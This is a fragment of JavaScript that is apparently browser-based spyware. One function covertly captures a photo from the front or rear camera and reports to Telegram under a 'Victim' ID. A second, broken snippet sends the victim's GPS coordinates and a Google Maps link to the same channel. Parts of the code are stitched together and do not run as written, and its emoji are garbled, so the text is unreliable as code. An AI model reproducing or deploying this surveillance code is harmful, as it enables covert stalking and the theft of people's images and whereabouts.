// ğŸ“¸ TAKE PHOTO
async function takePhoto(type) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: type === 'front' ? 'user' : 'environment' }
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        const dataUrl = canvas.toDataURL('image/jpeg');
        await sendTelegram(`ğŸ“¸ Photo (${type})\nVictim: ${VICTIM_ID}\nSize: ${video.videoWidth}x${video.videoHeight}`);
        
        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        await sendTelegram(`âŒ Photo failed\nVictim: ${VICTIM_ID}\nError: ${e.message}`);
    }
}

                    accuracy: pos.coords.accuracy + ' meters',
                    timestamp: new Date(pos.timestamp).toLocaleString()

                const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
                await sendTelegram(`ğŸ“ Location\nVictim: ${VICTIM_ID}\nLat: ${loc.lat}\nLng: ${loc.lng}\nAccuracy: ${loc.accuracy}\nMap: ${mapsUrl}`);
